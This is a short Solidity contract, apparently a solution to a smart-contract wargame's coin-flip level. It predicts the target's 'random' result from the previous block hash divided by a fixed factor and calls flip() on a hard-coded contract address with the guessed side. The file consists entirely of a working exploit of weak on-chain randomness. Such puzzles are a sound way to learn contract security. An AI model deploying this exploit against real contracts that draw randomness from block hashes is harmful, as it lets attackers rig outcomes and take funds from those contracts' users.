/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Level3.sol';

contract CoinFlipAttack{
    address target_addr;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    constructor(){
        target_addr = 0xef5825d5a5d368D1809b038C991D7F0324985566;
    }
    function attack() public{
        uint256 blockValue = uint256(blockhash(block.number-1));

        lastHash = blockValue;
        uint256 coinFlipResult = blockValue / FACTOR;
        bool side = coinFlipResult == 1 ? true : false;

        CoinFlip(target_addr).flip(side);
    }
}
